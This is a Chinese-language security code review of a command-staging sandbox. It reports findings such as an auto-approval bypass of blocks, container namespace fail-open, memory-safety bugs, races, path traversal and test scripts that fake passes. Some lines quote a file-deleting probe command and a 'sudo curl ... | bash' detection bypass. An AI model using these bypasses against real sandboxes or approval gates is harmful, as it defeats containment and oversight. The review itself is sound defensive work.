# dsh-stage-sandbox 代码审查报告

- **审查对象**：`dsh-stage-sandbox`（commit `e3f02c0`，工作区干净；`open-code-review` 目录为未跟踪的工具源码，未纳入审查）
- **审查工具**：Open Code Review (ocr) v1.13.10，`ocr scan` 全文件扫描（非 diff）
- **模型**：`deepseek/deepseek-v4-pro`（OCR 侧配置）
- **执行时间**：2026-11-15 17:48–20:44（`elapsed=2h56m56s`）
- **消耗**：33,420,885 tokens（input 27,755,399 / output 5,665,486 / cache read 21,433,984）
- **结果状态**：`completed_with_errors`（5 次工具调用失败：3 次 `code_search` 正则错误、2 次 `code_comment` 参数 JSON 解析错误；其余文件均完成）
- **产出**：1,169 条行级评论；critical 20、high 181、medium 510、low 458
- **追加（2026-11-16）**：对 7 个 `too_large` 文件拆成 36 个连续切片补扫，新增 151 条（critical 1 / high 36 / medium 70 / low 44），见 §8

> 说明：本报告中的“复核”列由我回读源码逐条核对。OCR 的严重度是它的判断，复核后会标注“确认 / 条件触发 / 降级 / 待真机复核”。未逐条复核的 181 条 high 在文末指向原始清单。

---

## 0. 结论摘要

整体上，这个仓库的架构分层、fail-closed 意识、测试与文档密度都明显高于一般项目；但这次全量扫描仍然发现了一批**真实的安全边界与数据完整性问题**，集中在四类：

1. **审批/隔离的 fail-open**：会话自动审批可以绕过非硬拒绝的 `block`（L3 系统路径）；Linux 容器命令识别遇到全局选项时分错子命令，导致不追加命名空间共享参数。
2. **shim 的内存安全**：`ws_mask.c` 的 double-free 与 `snprintf` 计数溢出、`ws_entry.c` 的堆越界读、注入器把 64 位模块基址截断成 32 位——都在“配置/探针/长路径”这类可构造输入上可达。
3. **控制面并发与幂等**：`hostop.replay`、`broker.invoke`、`publisher.publish`、`grant` 预算、`lease` TTL 都存在 check-then-act 竞态或缺失校验；`cgroup`/`pending-store` 的 id/digest 消毒允许 `..`，可越出状态目录。
4. **“诚实证据”被削弱**：审计探针会删除真实工作区的 `package.json`；`run-tests.sh` 的失败统计在子 shell 里丢失、生成的 JSON 缺逗号；多个 e2e 脚本在失败时仍 `exit 0`——这些恰好会制造“假绿”。

### 建议的 P0（立即修）

- `packages/win/plugin/risk.ts:156`：`sessionAuto` 放行了非硬拒绝的 `block`
- `packages/linux/src/control/hostop.ts:93`：replay 无 in-flight 状态，可并发执行两次宿主机命令
- `packages/win/src/audit.ts:603`：审计探针删除真实 `package.json`
- `packages/linux/src/runtime/container.ts:47`：容器子命令识别 fail-open
- `packages/win/src/executor.ts:5002`：只读分类器对 `cmd /c <载荷>` 直接跳过，未登记程序不扫描（拆分补审新增，见 §8.2）

> 原本列入 P0 的 `paths.ts` `canonical()` 顺序问题经实测是误报，见 §2.3。

---

## 1. 审查方法与覆盖

### 1.1 命令与参数

```powershell
$env:DEEPSEEK_API_KEY=...        # 仅进程环境，未写入仓库
ocr scan --format json --output .lead/ocr/scan-full.json --audience agent `
  --background "dsh-stage-sandbox ... 审查重点：暂存期间真实工作区绝不被写、发布 CAS、删除权威、fail-closed、隔离边界与测试有效性。"
```

OCR 默认 `BATCH_STRATEGY=by-language`、`BATCH_SIZE=50`、批内 `--concurrency 8`；批次串行，所以 `.ts` 批次（200+ 文件）占了大部分时间。

### 1.2 覆盖

| 项 | 值 |
|---|---|
| 纳入审查文件 | 359 |
| 排除文件 | 171 |
| 总变更行（scan 口径） | +107,435 |
| 每包评论数 | win 860、linux 304、root 4、core 1 |
| 每包 critical/high | win 12/105、linux 8/76 |

**被 OCR 排除、但属于核心实现的大文件（`too_large`，未审查）：**

| 文件 | 行数 |
|---|---|
| `packages/win/src/executor.ts` | 6,973 |
| `packages/win/shim/src/ws_file.c` | 4,504 |
| `packages/win/src/workspace.ts` | 4,158 |
| `packages/win/src/registry-stage.ts` | 3,770 |
| `packages/win/dsh-plugin/client.ts` | 3,481 |
| `packages/win/dsh-plugin/staging-fs.ts` | 2,772 |
| `packages/win/dsh-plugin/shell-executor.ts` | 2,691 |

> 这 7 个文件恰好是 Windows 暂存/执行/注册表/客户端的主实现；本次“全仓”结论对它们**不成立**。2026-11-16 已把这 7 个文件拆成 36 个连续行片段补扫（§8），但**切片审查仍不等价于整文件语义审查**：跨切片的数据流、类成员间约束和编译期上下文仍可能漏看。

其余排除项：`*.md` 文档、`pnpm-lock.yaml`、`.npmrc`（secret_exclude）、`packages/linux/tests/**`（default_path）、`e2e/**/fixtures/*.ps1`、`scripts/vendor/*` 等。

### 1.3 结果分布

| 严重度 | 数量 | 主要类别 |
|---|---|---|
| critical | 20 | security/bug |
| high | 181 | bug 为主 |
| medium | 510 | maintainability/bug |
| low | 458 | style/test/其他 |

类别：bug 571、security 113、test 141、maintainability 301、performance 18、documentation 19、style 6。

评论最集中的文件：`packages/win/src/capability.ts`(13)、`packages/win/shim/src/ws_mask.c`(13)、`packages/linux/src/stage/workspace-service.ts`(10)、`packages/win/tests/limits.ts`(9)、`packages/win/tests/crosscheck-boundaries.ts`(9)、`packages/win/src/appcontainer-runtime.ts`(9)、`packages/win/src/paths.ts`(8)、`packages/linux/src/workspace/logical.ts`(8)。

---

## 2. Critical 逐条复核

### 2.1 确认且建议立即修（生产/安全影响明确）

#### C1. 会话自动审批绕过 L3 `block` — `packages/win/plugin/risk.ts:156`（security）

```ts
if (sessionAuto && !neverAutoSkip) return true
```

`assess({ pathScope: 'system' })` 得到 `level=L3`、`action='block'`、`hardDeny=false`；`decide({ verdict, sessionAuto: true })` 会在 `if (verdict.action === 'block') return false` 之前返回 `true`。这与注释“会话自动审批只把 review 降为 auto”和第 3 条“未确认的 block ⇒ false”直接矛盾。`plugin/commands.ts:191-200` 正是用这个 `decide()` 过滤待应用单元，所以这是**生产审批路径**上的 fail-open。

**修复**：`if (sessionAuto && !neverAutoSkip && verdict.action === 'review') return true`，其余 `block` 仍要求 `confirmed`。

#### C3. `hostop.replay` 无 in-flight 状态 — `packages/linux/src/control/hostop.ts:93`（bug）

```ts
if (operation.state !== 'proposed') return { kind: 'rejected' }
const result = await run(operation.command)
this.operations.set(id, { ...operation, state: 'applied' })
```

两个并发 `replay(id)` 都会通过 `proposed` 检查，导致同一条宿主机命令执行两次；执行期间 `reject(id)` 写入的 `rejected` 会在 `await` 返回后被 `applied` 覆盖，registry 把“已拒绝”记为“已执行”，破坏 fail-closed 语义。`run()` 抛错时也没有任何 outcome 记录（见 high 清单同文件 :94）。

**修复**：`run` 前先置 `running`（或 in-flight 集合去重），完成后重新校验状态再写 `applied`；异常路径写 `unknown`/`failed`。

#### C4. 审计探针删除真实工作区 `package.json` — `packages/win/src/audit.ts:603`（bug）

写探针脚本包含：

```powershell
try { Remove-Item -LiteralPath '<workspace.root>/package.json' -ErrorAction Stop; $r.deleteOutside='ok' } catch { ... }
```

`workspace.root` 是真实工作区根，不是暂存根（暂存根在同一文件的 `workspace.store.stagedDir`）。注释和文件头都声明“唯一写操作发生在沙箱暂存根与垃圾目标上”，这里恰好相反：**一旦隔离失效（正是该审计要探测的故障形态），真实 `package.json` 会被真正删除**。改用脚本自己创建的 `outsideTarget`（`workspace.root/../.audit-outside-*`）即可：隔离正常时被拒，隔离失效时删除的是自建的垃圾文件。

#### C5. 容器子命令识别 fail-open — `packages/linux/src/runtime/container.ts:47`（security）

`subIndex` 取“第一个不以 `-` 开头的 token”，但没跳过带独立值的全局选项，也不识别 `podman container run` 这类分组命令：

- `podman --log-level debug run …` → 子命令被当成 `debug`
- `podman --root /tmp/x run …` → 子命令被当成 `/tmp/x`
- `podman container run …` → 子命令被当成 `container`

这些情况下函数返回 `confined: true`，但**不会追加** `--net=host --pid=host --ipc=host --uts=host`，容器没有共享沙箱命名空间，属于 fail-open。`argv.includes(flag)` 也只认 `--net=host` 形式，不认 `--net host`，也不处理用户显式传入的冲突值。

**修复**：解析全局选项及其取值、识别分组命令；对无法可靠识别的形式按 fail-closed 拒绝（或至少不返回 `confined: true`）。

### 2.2 确认，但需要特定输入/条件（高优先级加固）

| # | 位置 | 问题 | 复核结论 |
|---|---|---|---|
| C6 | `packages/win/shim/src/ws_mask.c:271` | `re_new(N_REP)` 失败时 `re_free_node(atom)`，但 `atom` 仍在 slab 中；`ws_mask_compile` 失败路径 `r->root == NULL` 时遍历 slab 再 free ⇒ double-free | **确认**。触发需解析失败（节点数超 `WS_RE_MAX_NODES` 或 OOM），输入来自 mask 规则文件 |
| C7 | `packages/win/shim/src/ws_mask.c:1086`（实际循环在 :1136） | `written += snprintf(...)` 按“应写长度”累加；单条记录（`pathEsc` 最多 ~4KB）可超过剩余缓冲，`512*1024 - written` 下溢，随后在堆缓冲区外写闭合 JSON | **确认**。需一段带大量反斜杠/长路径的 probe；溢出量可达数 KB |
| C8 | `packages/win/shim/audit/winstage-rec.c:146` | `wcsncpy(cmdline+pos, argv[k], 32767-pos)` 不保证 NUL，`pos += l` 后可越过 32767，末尾 `cmdline[pos]=0` 越界 | **降级为加固项**：`wmain` 的 argv 受 Windows 命令行 32767 字符上限约束，`pos` 实际很难 >32767；但“不检查剩余空间”的写法仍应修 |
| C9 | `packages/linux/src/pal/capabilities.ts:25` | `STATUS_RANK[undefined] < ...` 为 `false`，缺失/未知能力被 `filter` 漏掉 ⇒ `meetsRequirements` 返回 true | **确认（防御缺口）**。类型上报告是完整 `Record`，但反序列化/外部后端可缺键 |
| C10 | `packages/linux/src/pal/probe.ts:155` | 对调用方传入的 `baseDir` 也执行 `probe.cleanup(baseDir)`，默认 cleanup 是 `rmSync(dir, {recursive:true})` | **确认（潜在）**。仓库内生产调用只传 `{environment}`，不传 `baseDir`；测试/未来调用会踩 |
| C11 | `packages/linux/src/runtime/cgroup.ts:209` | `sanitizeId` 保留 `.`，空串也原样返回；`id='..'` 时 `${parent}/..` 等于 base，`create/kill/release` 会作用到根 cgroup | **确认**。需 id 可控（内部生成 id 时风险低，但公共方法不应假设） |
| C12 | `packages/linux/src/stage/pending-store.ts:165` | `digest` 消毒正则允许 `.`/`..`；`dropCandidate('..')` 会 `rmSync(candidateDir/.., {recursive:true})` | **确认**。digest 通常来自内容摘要，正常不可控；仍是路径穿越加固点 |
| C13 | `packages/win/dsh-plugin/run-capture.ts:808` | `diffAgainst` 对 `base` 的键直接 `pathKey()`；镜像键中工作区内条目是相对路径，`canonical(relative)` 按 `process.cwd()` 解析，工作区文件全被判 `created`，删除检测也查错路径 | **确认（条件）**。`capture()` 走镜像文件且 CWD ≠ workspaceRoot 时触发；`prime()` 直接返回的 Map 键是绝对路径，不受影响 |
| C14 | `packages/win/plugin/policy/engine.ts:162` | `PolicyRule` 类型允许 `undefined`（“不表态”），但 `normalizeResult(undefined)` 归一成 `POLICY_INVALID_RESULT` 的 DENY | **确认（契约 bug）**。当前 `evaluate()` 只在 `tests/plugin-approval-align.ts` 使用，尚未接生产；一旦接入，任一 no-op 规则会 DENY 一切 |
| C15 | `packages/win/src/appcontainer.ts:287` | `sidString = strSlot[0]` 后 `LocalFree(strSlot[0])` 再返回；`strSlot[0]` 是 Koffi 的 `void*` 外部指针，不是 JS 字符串 | **确认（实现错误）**。消费方 `grantPathToAppContainerSid` 用 `` `*${sidString}` `` 拼 icacls 参数，实际会变成无效 SID，T0 fail-closed；若有人对该指针做 decode，则是 UAF |
| C16 | `packages/win/src/cli.ts:747` | `process.exit()` 在 `try` 内，`finally { executor.dispose() }` 不执行；`readOnlyScratch` 也不删除 | **确认**。`executor.ts:554-564` 已用 `process.exit` 的 `exit` 事件兜底撤销 ACL，但临时目录清理仍被跳过；实际风险中低 |
| C17 | `packages/win/src/wfp.ts:895` | 错误码表错位：`0x80320003` 应是 `FWP_E_FILTER_NOT_FOUND`，表里写成 `ALREADY_EXISTS`；`installSubLayer`/`deleteFilterById`/`deleteSubLayerByKey` 的幂等判断因此用错 HRESULT | **确认**。官方值：FILTER_NOT_FOUND 0x80320003、LAYER_NOT_FOUND 0x80320004、SUBLAYER_NOT_FOUND 0x80320007、NOT_FOUND 0x80320008、ALREADY_EXISTS 0x80320009、IN_USE 0x8032000A |
| C18 | `packages/win/tools/build-shim.ts:609` | `Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), ...)` 在 Node 主线程直接抛 `TypeError` | **确认**。只在“编译输出被瞬态锁占用、进入重试”时触发，恰恰是最需要重试的场景 |
| C19 | `packages/linux/ebk/linux-package/run-tests.sh:16` | `add "$(record ...)"` 在命令替换子 shell 中执行，`FAILS` 赋值回不到父 shell ⇒ `"failures"` 恒空、`"passed"` 恒 true | **确认**。这是 VM 一致性测试脚本，会让失败用例上报通过 |
| C20 | `packages/linux/ebk/linux-package/run-tests.sh:21` | `add` 只追加换行不加逗号；`tr -d '\n'` 后多个对象拼成 `{...}{...}`，`RESULT_*.json` 非法 | **确认**。同上，属于证据有效性问题 |

### 2.3 复核后排除的误报

**C2 原判：`canonical()` 先 `normalize` 后 `realpath`，可被 junction + `..` 绕过。**

实测结论：**在 Windows 上不成立**。Win32 路径在打开前就按字面折叠 `..`，与 `canonical()` 的 `lexical() → normalize` 顺序一致。实测（临时目录建 junction 后放两份内容不同的 `x.txt`）：

```text
C:\...\real\junc -> C:\...\outside
路径: C:\...\real\junc\..\x.txt
GetFullPath: C:\...\real\x.txt
Get-Item:    C:\...\real\x.txt   Content: LEXICAL
Node realpath+CWD: C:\...\real\x.txt   Content: LEXICAL
```

也就是说，`junc\..\x.txt` 被解析成 `real\x.txt`，而不是 junction 目标的父目录。`realpathSync.native` 同样遵循这一语义。`lexical()` 还会剥离 `\\?\` 前缀，使扩展路径回落到同一套 Win32 归一，因此没有发现可构造的绕过。

保留建议：为 `canonical()` 增加“junction + `..` / 8.3 短名 / 悬空链接”的回归用例，锁定这个语义；但**不需要**调整 `normalize` 顺序。

OCR 的 20 条 critical 中，C2 是明确的误报；C8、C10、C11、C12、C13、C14、C16、C20 属于“代码事实成立、实际触发需要特定条件/属于测试或加固面”，已在表中逐条标注。

---

## 3. High 主题（181 条中的代表项）

> 这些是 OCR 判为 high、我抽样回读后认为“方向可信”的条目；未逐条复现。完整 181 条见 `.lead/ocr/comments.md` / `triage.md`。

### 3.1 Windows shim 内存安全 / 并发 / fail-closed

- `packages/win/shim/src/ws_entry.c:306-327`：`tmp` 为 `WS_PATH_MAX*6`（196,608 字节），三个 JSON 转义路径最多各 `WS_PATH_MAX*3`（98,304 字节），`snprintf` 返回的 `n` 可超过 `tmp`；当 `cch > sizeof(tmp)` 时 `memcpy(buf, tmp, copy)` 越界读堆内存。
- `packages/win/shim/injector/winstage-inject.c:513`：`GetExitCodeThread` 只返回 32 位 DWORD，64 位目标里 `LoadLibraryW` 的模块基址被截断，随后 `resolve_remote_export(remoteModule)` 用错基址。
- 同文件 `:554`：只把最高位为 1 的 `initRc` 判为失败；`WinstageShimInit` 返回普通非 0 错误码时仍放行子进程（注释只允许哨兵 1058），属注入 fail-open。
- `packages/win/shim/src/ws_mask.c:867-888`：`g_mask.rules` 容量 128；`readDenyFile` 可加载满 128 条后再追加最多 32 条内联 `readDeny`，数组越界写。`:809` 则在 mask 文件条目超过容量时静默丢弃，不置 `hardFailure`，策略 fail-open。
- `packages/win/shim/src/ws_regstore.c:102`：`g_tombs/g_tombCount` 无同步，注册表 IAT 钩子运行在多线程目标进程内；`:532` 在物化 overlay 后仍用物化前的 `inOverlay=0`，overlay 副本永不被物理删除，只靠内存 tombstone 隐藏。
- `packages/win/shim/src/ws_t3reg.c:618`：journal 不存在与“存在但读失败/超过 64MB/分配失败”都返回 NULL，调用方统一当“尚无 journal”，`viewIncomplete` 不置位；`:575` 重放只加 tombstone、后续 CREATE/SET 不清除，删除后重建的键会被误判为已删除；`:1040` 全局计数/状态无锁。
- `packages/win/shim/src/ws_hook.c:203`：`g_targets` 少了设计注释里点名的 `LdrGetProcedureAddress`；`:555` 站点数达 8192 后直接 return，但 IAT 槽已改写，卸载时只按 `g_sites[0..count)` 恢复，残留槽位指向已卸载的 shim。
- `packages/win/shim/src/ws_util.c:219`：`ws_lock_leave` 不校验持有者与 `depth>0`，任意线程调用会破坏互斥；`winstage_internal.h:296` 的 `volatile` 同步也不足。
- `packages/win/shim/probe/winstage-probe.c:128`：`write_out` 忽略两次 `WriteFile` 的返回值与写入字节数，磁盘满/部分写时证据被静默截断却仍返回成功。

### 3.2 Windows 运行时、审批与补丁

- `packages/win/patches/dsh/pristine/P2-escalation-advertisement-gate/index.js:46`：`completed` + `exitCode: null/undefined` 被 `?? 0` 报成 `exit code: 0`，失败当成功。
- `packages/win/patches/dsh/pristine/P2.../index.js:703`：前台/后台工具切换先注销再注册，`register` 抛错会永久丢失 pwsh 工具；两次调用之间存在“无工具”窗口。
- `packages/win/patches/dsh/pristine/P3-permission-custom-default/client.js:654`：`mutate` 只有 `finally` 没有 `catch`，网络异常会留下 `saving` 状态与未处理 Promise rejection。
- `packages/win/e2e/domains/fs/risk.ps1:11`：解析失败打印 `REVIEW-PARSE-FAILED` 仍 `exit 0`；`.../pip/runall2.ps1:51` 用原串长度对压缩后的串做 `Substring`，越界抛异常；`.../r2/registry/a01-02.ps1:55` 给 `_hash.ps1` 传 `HKCU\...`（无冒号），永远 `exists=False`。
- `packages/win/e2e/guest/bootstrap.ps1:125/142/152`：致命错误只记 FATAL 不退出；`sandbox-lane.json` 在父目录全量递归搜索可能取到别的 run；污染判定只比 `FullName` 不比 `sha256`，修改/删除不算污染。
- `packages/win/tools/lib/zip.mjs:60`：`cdSize/cdOffset` 来自 zip，未校验 `cdOffset+cdSize <= file size` 就 `Buffer.alloc(cdSize)`，可触发 OOM 或越界读。

### 3.3 Linux 隔离边界

- `packages/linux/src/broker/network.ts:116`：`isProhibitedTarget` 未覆盖 `::`、`::ffff:127.0.0.1`、`::ffff:169.254.169.254`、IPv6 回环完整形式等；`:223` 预算检查与计量是 TOCTOU；`:249` `account` 不校验负值，可回退已用字节。
- `packages/linux/src/web/sandboxed-web.ts:50`：只对初始 URL 授权，`fetch` 默认跟随重定向，最终落点绕过 `authorize`/`isProhibitedTarget`；`:79` 直接比较 `hostname`，`localhost.`/`metadata.google.internal.` 这类尾点 FQDN 可绕过。
- `packages/linux/src/profiles.ts:40`：Landlock 回退路径用 `readOnly: ['/']`，把整个宿主根只读暴露；与 bwrap 的最小只读白名单不是同一强度。
- `packages/linux/src/runtime/options.ts:183`：seccomp 默认 `require: false`，过滤器缺失时降级为无 seccomp 运行；`:79` 把整个 `/var/lib` 挂进沙箱（含 `machine-id`、数据库目录等），超出“minimal root”目标。
- `packages/linux/src/runtime/profile.ts:227`：`isGlob` 用 `/[*?[]/` 判断，合法字面路径 `data[1]`、含 `?` 的文件名会被当 glob 展开，无匹配时可能静默丢路径。
- `packages/linux/src/runtime/resident.ts:181`：`deletions` 的 `relative` 未校验就拼到 `${workspace}/${relative}` 后 `rm -rf --`，空串/`.`/`..`/绝对路径可删到 workspace 外；`:178` 的 `cp -a ... || true` 吞掉复制失败。
- `packages/linux/src/workspace/logical.ts:203`：`stateOf` 对 symlink 落入 `staged-file` 分支后用 `readFileSync` 跟随读取；`:606` `copyInto/exportDelta` 原样 `symlinkSync(entry.linkTarget)`，绝对/`..` 目标可逃逸。
- `packages/linux/src/runtime/overlay.ts:44`：`probeOverlaySupport` 使用 `--overlay-src lower --overlay upper work dest`；`--overlay` 是否是目标 bwrap 版本的有效选项需要真机复核（若无效，overlay 永远走全量复制回退，属于静默降级，不是安全漏洞）。
- `packages/linux/src/stage/stager.ts:82`：stdout/stderr 无界字符串累积，被暂存命令可以 `yes`/`cat /dev/zero` 把宿主进程内存打爆，与文档“bounded by the runner”矛盾。

### 3.4 Linux 控制面并发 / 幂等

- `packages/linux/src/broker/broker.ts:65`：去重检查在 `await adapter.available()/invoke()` 之前，两个同 `operationId` 并发调用都会执行；`:71` adapter 抛异常不记录 outcome，调用方重试可能重复副作用。
- `packages/linux/src/control/grant.ts:88`：`findCovering` 不按 `taskId` 过滤，重叠根目录的其他任务 grant 可覆盖本任务；`:94` 预算检查与消费非原子。
- `packages/linux/src/control/lease.ts:59`：`ttlMs` 为 `NaN`/`Infinity` 时 `expiresAt` 也是 `NaN`/`Infinity`，`check` 的比较可能永不过期。
- `packages/linux/src/publish/publisher.ts:106`：`leases.check` 不校验 `lease.resource === target`，资源 A 的租约可用于资源 B；`:110` fencing token 未传给 backend.apply；`:113` 幂等检查与 apply 之间无按 operationId 串行化。
- `packages/linux/src/publish/directory-backend.ts:107`：`entry.path` 无包含性校验，`..`/绝对路径可逃出 root；`:131` 中间父路径的符号链接会被 `mkdirSync` 跟随；`:155` CAS 检查与写入不是原子操作（TOCTOU）。
- `packages/linux/src/control/store.ts:206`：`FileControlStore` 只有进程内 `stateVersion`，无跨进程文件锁/CAS；两个控制面进程会互相覆盖。
- `packages/linux/src/control/service.ts:273`：`publish` 在 `await publisher.publish` 前持租约，但无 `try/finally`，异常会泄漏租约；`:196` `submit` 绕过 `transition` 直接 `store.commit`。
- `packages/linux/src/publish/receipt-store.ts:80`：先更新内存 Map 再写盘，写盘失败时 `get()` 返回未落盘的 receipt，破坏幂等。

### 3.5 候选/策略

- `packages/linux/src/candidate/danger.ts:249`：命令分类不剥 `sudo/doas/runas/su` 前缀，`sudo curl ... | bash` 的 exe 是 `sudo`，绕过 DOWNLOADERS 判定。
- `packages/linux/src/candidate/script-scan.ts:245`：无扩展名但带 shebang 的脚本被静默忽略；`:261` 文件读入的脚本体不检测 `$(...)`/`$VAR`，动态构造的危险命令被当静态文本。
- `packages/linux/src/candidate/git-guard.ts:87`：黑名单策略，`git hash-object -w`、`git update-ref` 等未知写动词默认放行；`:54` `su -c 'git ...'` 的选项解析顺序有误。
- `packages/linux/src/candidate/manifest.ts:30`：`lstat` 确认普通文件后 `digestFile` 重新按路径打开，存在 symlink 替换 TOCTOU；`:43` 把 FIFO/socket/设备也当普通文件 `readFileSync`，无写方时永久阻塞。
- `packages/linux/src/policy/engine.ts:84`：`executor.available()/evaluate()` 没有 try/catch，“失败返回 DENY”只在 executor 自己遵守时才成立；`packages/linux/src/policy/plugin.ts:55`：`config.packs` 为空时 `aggregate([])` 返回 ALLOW；`packages/linux/src/policy/verdict.ts:73`：未知/拼错的 decision 被忽略；`packages/linux/src/policy/pack.ts:62`：`signature = digestOf(rules)` 是无密钥自引用，不能防篡改。

### 3.6 发布/工作区完整性

- `packages/linux/src/publish/writer.ts:39`：对目标路径直接 `writeFileSync`，崩溃/磁盘满会留下截断文件；应临时文件 + fsync + rename。
- `packages/linux/src/workspace/logical.ts:518`：`copyOnWrite=false` 时 `reBase` 只更新 baseRoot，不刷新 stagingRoot 的全量副本；`:572` overlay whiteout 把 `.wh.<name>` 自身路径传给 `markDeleted`；`:674` staged 非目录覆盖 base 目录后，base 子孙仍被列出；`:705` `copyUp` 对“部分物化”目录重命名会丢数据。
- `packages/linux/src/stage/workspace-service.ts:400`：同一分支的 `apply` 无串行化；`:530` 选择性发布成功后 `reBase` 抛错会跳过 `clearPending`，出现“已发布但仍显示待处理”；`:263` 并发 `ensureResident` 会覆盖前一个 resident。
- `packages/linux/src/fs/staged-fs.ts:83`：`wasMaterialized` 在 `await stageTarget` 前快照，两个并发写可能都走无条件覆盖路径。
- `packages/linux/src/util/canonical.ts:38`：`undefined` 字段被静默丢弃，与“undefined 抛错”的 fail-closed 注释矛盾，不同值可产生相同摘要。
- `packages/linux/src/secrets/phases.ts:103`：占位符互为子串时，先替换的会破坏后一个，残留密钥不被替换。
- `packages/linux/src/util/conceal.ts:11`：`dsh-overlay-` 排在 `dsh-overlay-probe-` 前，指纹永远不会被完整脱敏。

### 3.7 工程/配置

- `packages/win/package.json:51`：`scripts` 直接 `node tools/build-plugin.ts`，但 `engines` 写 `node >=20.16`；Node 20 不能直接运行 `.ts`（类型剥离默认要 22.6+/23.6+），声明的最低版本上 `build/prepack` 会失败。
- `packages/win/e2e/domains/browser3/code/full_probe.py:16`：探针捕获所有异常只写 report，末尾不按失败项 `sys.exit(1)`，CI 消费时永远是 0。
- `packages/win/e2e/domains/sensitive/probe-sen04.ps1:7`：`Set-Content` 失败不终止、不记录，后续“秘密未外泄”的结论可能建立在“秘密根本没写进去”上。

---

## 4. 与仓库既有“已知限制”的关系

README 和 `packages/win/docs/Windows功能开启清单.md` 已诚实登记 R1–R21（读面/网络面/nested/RAW syscall 等）。本报告中的以下项目**不属于**那些“已知限制”，而是新的实现级缺陷：

- C1（sessionAuto 绕过 L3）
- C3（hostop 并发 replay）
- C4（审计删除真实文件）
- C5（容器子命令 fail-open）
- C6/C7（mask double-free / 堆溢出）
- 3.3 中的 Web 重定向/尾点绕过、Landlock `/`、seccomp `require:false`
- 3.4 中的 publisher/directory-backend 竞态与路径校验
- 3.7 中的测试证据 fail-open

而 R1/R2（读面/网络面不收敛）等属于设计取舍，扫描里的部分“无边界”评论若与 R1/R2 重叠，应按既有口径归类，不应重复计入新缺陷。

---

## 5. 建议修复顺序

### P0（阻断合并/上线前必修）

1. `risk.ts` sessionAuto 只放行 `review`。
2. `hostop.replay` 增加 in-flight 状态与状态复核。
3. `audit.ts` 改为删除自建垃圾目标，不再碰真实 `package.json`。
4. `container.ts` 修正子命令解析，无法识别时 fail-closed。

### P1（本轮修）

5. `ws_mask.c` double-free / snprintf 边界。
6. `ws_entry.c` `snprintf` 返回值与 `memcpy` 上限。
7. 注入器 64 位模块基址与 `initRc` 白名单。
8. `wfp.ts` 错误码表与幂等判断。
9. `cgroup.ts` / `pending-store.ts` 的 id/digest 严格校验。
10. `publisher.ts` / `directory-backend.ts` 的租约-资源绑定、路径包含校验、fencing 透传。
11. `broker.network` 的 IP/预算问题，`sandboxed-web` 的重定向与尾点归一。
12. `run-tests.sh` 的 FAILS 子 shell 与 JSON 逗号。
13. e2e 脚本的 `exit 0` / 污染判定 / `Substring` 越界。

### P2（下一轮）

14. `capabilities.ts` 缺失键 fail-closed。
15. `policy/engine.ts` `undefined` 规则跳过。
16. `probe.ts` 只清理自建 `baseDir`。
17. `appcontainer.ts` 先 decode SID 再 `LocalFree`。
18. `cli.ts` 把 `process.exit` 移到 `finally` 之后。
19. `build-shim.ts` 用同步休眠替代 `Atomics.wait`。
20. `package.json` engines 与 TS 直跑的实际要求对齐。

### 追加（2026-11-16 拆分补审）

- **P0**：`executor.ts:5002` 的只读分类器对命令位上的字面解释器（`cmd /c ...`）直接跳过，载荷里的未登记程序不被扫描（详见 §8.2）。
- **P1**：`executor.ts` 的 Job Object 偏移（`:352`）、ACE 回读未校验 rights（`:1115`）、`after.ok===false` 时 `repaired` 误判（`:1463`）、超时定时器不清除（`:3018`）、T1 catch 不 terminate（`:4156`）、`tracked` 从不 add（`:7023`）。
- **P1**：`ws_file.c` 的 `FILE_OPEN_IF` 未按写意图处理（`:1731`）、NtQueryAttributesFile 绕过 mask（`:4334`）、CopyFileW `failIfExists` 漏判暂存副本（`:3440`）。
- **P1**：`workspace.ts` 的替换失败静默丢原件路径（`:627`）、陈旧锁先按 mtime 后看 pid（`:2447`）、仅 hostOperations 时不冻结（`:4199`）。
- **P1**：`staging-fs.ts` 的 `String.replace` 把 `newString` 当替换模式（`:697`）、`streamText` 异工作区分支绕过 mask（`:2698`）。
- **P1**：`shell-executor.ts` 把 `read-only` 请求当成“更宽”并继续以 `workspace-write` 执行（`:1948`）；`client.ts` 的批准命令行未转义路径（`:2292`）。

---

## 6. 覆盖缺口与后续

### 6.1 `too_large` 的 7 个核心文件

见 §1.2。它们没有被本次 scan 审查，**不能因为本报告没点名就认为它们没问题**。建议二选一：

- 用 `ocr scan --path <file> --max-tokens 110000` 逐个大文件审（成本高、上下文接近上限）；
- 或按模块拆分为更小的审查单元（推荐），例如把 `executor.ts` 按“启动器/T0/T1/T2/dispose”拆开。

### 6.2 R48 提交的 diff 补审（手工，替代超时的 OCR commit review）

`master` 领先 `origin/master` 1 个提交（`e3f02c0`，8 个可审文件 / +1,787 行），其中 `packages/win/src/executor.ts` 与 `packages/win/dsh-plugin/shell-executor.ts` 属于 `too_large` 集合。`ocr review --commit HEAD` 因新增的 1,355 行 `run-suite.mjs` 在 1 小时后仍未完成，已取消并改为人工审阅这两个文件的 diff（其余 6 个文件已被 scan 覆盖）。

R48 diff 补充发现：

1. **`packages/win/dsh-plugin/shell-executor.ts:157`：全局 `Get-ChildItem` 包装函数会破坏管道输入。**
   `ENCODING_PREAMBLE` 里 `function global:Get-ChildItem { $wsList = @(Microsoft.PowerShell.Management\Get-ChildItem @args); ... }` 没有 `process` 块，因此在 `Get-Item . | Get-ChildItem`、`Get-ChildItem -InputObject ...` 等管道用法中会忽略输入、直接列出当前目录。该 preamble 会注入**每条** PowerShell 命令，属于全局行为变更。
2. **同文件：递归列出的遮蔽不完整。**
   过滤条件只在 `$wsParent -eq $wsCwd` 时生效；`Get-ChildItem -Recurse`（或 `dir /s` 走 cmd）列出的 `fs/wo/reg/shim.log/...` 的父目录不是当前目录，仍会出现在输出里。注释声称“keep the guest workspace listing clean”，实际只清理了单层。
3. **同文件：按名字隐藏 `.winstage*` 会波及用户文件。**
   过滤对当前目录下所有 `.winstage*` 生效，而不只 shim 自己的控制条目；用户若恰有同名文件会被静默隐藏。
4. **`packages/win/dsh-plugin/host-plugin.ts:1517`：注册表候选的路径回映射用 `Map<displayPath, internalPath>`，会折叠 32/64 位视图的同名路径。**
   `registryPaths` 用 `displayPath ?? path` 作为匹配键，再 `Map` 回内部路径。若 32 位视图与 64 位视图的 `displayPath` 相同（例如同一个 `HKLM\Software\X` 在两个视图各有一份候选），`matchPathsDetailed` 会匹配到两条，但 `seen` 按 `change.path` 去重、`Map` 只保留最后一条内部路径，结果只批准其中一个视图，且不会报 ambiguous。建议用内部路径作为身份/歧义判据，或在 displayPath 重复时报歧义。
